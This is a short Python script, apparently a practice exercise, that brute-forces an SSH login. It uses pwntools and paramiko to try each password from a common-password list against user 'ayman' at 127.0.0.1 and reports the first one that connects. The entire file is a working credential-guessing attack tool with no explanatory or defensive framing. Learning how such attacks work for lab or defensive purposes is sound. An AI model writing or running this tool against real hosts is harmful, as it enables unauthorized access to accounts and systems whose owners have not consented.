#!/bin/python3

from pwn import *
import paramiko
# import sys

host = "127.0.0.1"
username = "ayman"
attempts = 0

with open('ssh-common-passwords.txt', 'r') as password_list:
	for password in password_list:
		password = password.strip('\n')
		try:
			print("[{}] Attempting Passwords: '{}'!".format(attempts,password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid Password found: '{}' ".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
				print("[>] Invalid Password!")
		attempts += 1

		# except KeyboardInterrupt:
			#print("\nExiting...")

